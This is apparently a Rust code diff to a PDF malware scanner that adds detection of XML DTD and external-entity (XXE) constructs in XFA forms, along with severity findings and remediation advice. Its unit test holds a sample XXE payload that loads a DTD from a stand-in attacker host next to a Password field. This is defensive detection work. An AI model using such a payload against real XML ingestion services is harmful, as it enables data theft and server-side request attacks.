@@ -4,7 +4,7 @@ use std::collections::{HashMap, HashSet};
 use roxmltree::Document;
 use sis_pdf_core::detect::{Cost, Detector, Needs};
 use sis_pdf_core::evidence::EvidenceBuilder;
-use sis_pdf_core::model::{AttackSurface, Confidence, Finding, Severity};
+use sis_pdf_core::model::{AttackSurface, Confidence, Finding, Impact, Severity};
 use sis_pdf_core::scan::ScanContext;
 use sis_pdf_core::timeout::TimeoutChecker;
 use sis_pdf_pdf::xfa::extract_xfa_script_payloads;
@@ -22,6 +22,8 @@ pub struct XfaFormRecord {
     pub sensitive_fields: Vec<String>,
     pub script_preview: Option<String>,
     pub has_doctype: bool,
+    pub xml_entity_count: usize,
+    pub external_entity_refs: usize,
 }
 
 pub fn collect_xfa_forms(ctx: &ScanContext) -> Vec<XfaFormRecord> {
@@ -50,6 +52,8 @@ pub fn collect_xfa_forms(ctx: &ScanContext) -> Vec<XfaFormRecord> {
                 sensitive_fields: stats.sensitive_fields,
                 script_preview: stats.script_preview,
                 has_doctype: stats.has_doctype,
+                xml_entity_count: stats.xml_entity_count,
+                external_entity_refs: stats.external_entity_refs,
             };
             records.push(record);
         }
@@ -108,6 +112,8 @@ impl Detector for XfaFormDetector {
                         sensitive_fields: &[],
                         script_preview: None,
                         has_doctype: stats.has_doctype,
+                        xml_entity_count: stats.xml_entity_count,
+                        external_entity_refs: stats.external_entity_refs,
                     });
                     findings.push(Finding {
                         id: String::new(),
@@ -129,10 +135,6 @@ impl Detector for XfaFormDetector {
                     });
                 }
 
-                if stats.has_doctype {
-                    continue;
-                }
-
                 let submit_list = &stats.submit_urls;
                 let field_list = &stats.sensitive_fields;
                 let base_meta = base_xfa_meta(XfaMeta {
@@ -144,7 +146,78 @@ impl Detector for XfaFormDetector {
                     sensitive_fields: field_list,
                     script_preview: stats.script_preview.as_deref(),
                     has_doctype: stats.has_doctype,
+                    xml_entity_count: stats.xml_entity_count,
+                    external_entity_refs: stats.external_entity_refs,
                 });
+
+                if stats.has_doctype || stats.xml_entity_count > 0 {
+                    let mut meta = base_meta.clone();
+                    let ingest_risk = if stats.external_entity_refs > 0 {
+                        "high"
+                    } else if stats.has_doctype {
+                        "medium"
+                    } else {
+                        "low"
+                    };
+                    meta.insert("backend.ingest_risk".into(), ingest_risk.into());
+                    findings.push(Finding {
+                        id: String::new(),
+                        surface: self.surface(),
+                        kind: "xfa_entity_resolution_risk".into(),
+                        severity: if stats.external_entity_refs > 0 {
+                            Severity::High
+                        } else {
+                            Severity::Medium
+                        },
+                        confidence: if stats.external_entity_refs > 0 {
+                            Confidence::Strong
+                        } else {
+                            Confidence::Probable
+                        },
+                        impact: Some(if stats.external_entity_refs > 0 {
+                            Impact::High
+                        } else {
+                            Impact::Medium
+                        }),
+                        title: "XFA XML entity-resolution risk".into(),
+                        description: "XFA payload includes XML DTD/entity constructs that can increase backend ingest risk when entity resolution is enabled.".into(),
+                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
+                        evidence: evidence.clone(),
+                        remediation: Some("Disable XML external entity resolution and DTD processing in all backend XFA/XML ingestion pipelines.".into()),
+                        meta,
+                        yara: None,
+                        position: None,
+                        positions: Vec::new(),
+                        ..Finding::default()
+                    });
+                }
+
+                if stats.external_entity_refs > 0 {
+                    let mut meta = base_meta.clone();
+                    meta.insert("backend.ingest_risk".into(), "high".into());
+                    findings.push(Finding {
+                        id: String::new(),
+                        surface: self.surface(),
+                        kind: "xfa_backend_xxe_pattern".into(),
+                        severity: Severity::High,
+                        confidence: Confidence::Strong,
+                        impact: Some(Impact::High),
+                        title: "XFA backend XXE pattern".into(),
+                        description: "XFA payload contains external XML entity declarations consistent with backend XXE-style ingestion risk patterns.".into(),
+                        objects: vec![format!("{} {} obj", entry.obj, entry.gen)],
+                        evidence: evidence.clone(),
+                        remediation: Some("Treat as high-risk for backend ingest paths and enforce strict parser hardening (no DTD, no external entities).".into()),
+                        meta,
+                        yara: None,
+                        position: None,
+                        positions: Vec::new(),
+                        ..Finding::default()
+                    });
+                }
+
+                if stats.has_doctype {
+                    continue;
+                }
 
                 for url in submit_list.iter().take(XFA_SUBMIT_URL_LIMIT) {
                     let mut meta = base_meta.clone();
@@ -314,12 +387,16 @@ struct XfaPayloadStats {
     sensitive_fields: Vec<String>,
     script_preview: Option<String>,
     has_doctype: bool,
+    xml_entity_count: usize,
+    external_entity_refs: usize,
 }
 
 fn inspect_xfa_payload(payload: &[u8]) -> XfaPayloadStats {
     let decoded = String::from_utf8_lossy(payload);
     let lower = decoded.to_ascii_lowercase();
     let has_doctype = has_doctype(&lower);
+    let xml_entity_count = count_xml_entity_declarations(&lower);
+    let external_entity_refs = count_external_xml_entities(&lower);
     let mut script_count = 0usize;
     let mut submit_urls = HashSet::new();
     let mut sensitive_fields = HashSet::new();
@@ -376,7 +453,30 @@ fn inspect_xfa_payload(payload: &[u8]) -> XfaPayloadStats {
         sensitive_fields: sorted_strings(&sensitive_fields),
         script_preview,
         has_doctype,
+        xml_entity_count,
+        external_entity_refs,
     }
+}
+
+fn count_xml_entity_declarations(input: &str) -> usize {
+    input.match_indices("<!entity").count()
+}
+
+fn count_external_xml_entities(input: &str) -> usize {
+    let mut count = 0usize;
+    let mut idx = 0usize;
+    while let Some(pos) = input[idx..].find("<!entity") {
+        let start = idx + pos;
+        let Some(end_rel) = input[start..].find('>') else {
+            break;
+        };
+        let segment = &input[start..start + end_rel + 1];
+        if segment.contains(" system ") || segment.contains(" public ") {
+            count += 1;
+        }
+        idx = start + end_rel + 1;
+    }
+    count
 }
 
 fn extract_attr_value(tag: &str, attr: &str) -> Option<String> {
@@ -479,6 +579,8 @@ struct XfaMeta<'a> {
     sensitive_fields: &'a [String],
     script_preview: Option<&'a str>,
     has_doctype: bool,
+    xml_entity_count: usize,
+    external_entity_refs: usize,
 }
 
 fn base_xfa_meta(meta_config: XfaMeta<'_>) -> HashMap<String, String> {
@@ -491,6 +593,8 @@ fn base_xfa_meta(meta_config: XfaMeta<'_>) -> HashMap<String, String> {
         sensitive_fields,
         script_preview,
         has_doctype,
+        xml_entity_count,
+        external_entity_refs,
     } = meta_config;
     let mut meta = HashMap::new();
     meta.insert("xfa.size_bytes".into(), size.to_string());
@@ -507,6 +611,9 @@ fn base_xfa_meta(meta_config: XfaMeta<'_>) -> HashMap<String, String> {
     meta.insert("xfa.object".into(), object_ref.to_string());
     meta.insert("xfa.ref_chain".into(), ref_chain.to_string());
     meta.insert("xfa.has_doctype".into(), has_doctype.to_string());
+    meta.insert("xfa.dtd_present".into(), has_doctype.to_string());
+    meta.insert("xfa.xml_entity_count".into(), xml_entity_count.to_string());
+    meta.insert("xfa.external_entity_refs".into(), external_entity_refs.to_string());
     meta
 }
 
@@ -566,5 +673,18 @@ mod tests {
             .as_deref()
             .map(|value| value.contains("alert"))
             .unwrap_or(false));
+    }
+
+    #[test]
+    fn test_detect_external_entity_patterns() {
+        let payload = br#"<?xml version="1.0"?>
+<!DOCTYPE xfa [ <!ENTITY ext SYSTEM "http://attacker.example/payload.dtd"> ]>
+<xfa:form xmlns:xfa="http://ns.adobe.com/xdp/">
+  <field name="Password"/>
+</xfa:form>"#;
+        let stats = inspect_xfa_payload(payload);
+        assert!(stats.has_doctype);
+        assert_eq!(stats.xml_entity_count, 1);
+        assert_eq!(stats.external_entity_refs, 1);
     }
 }
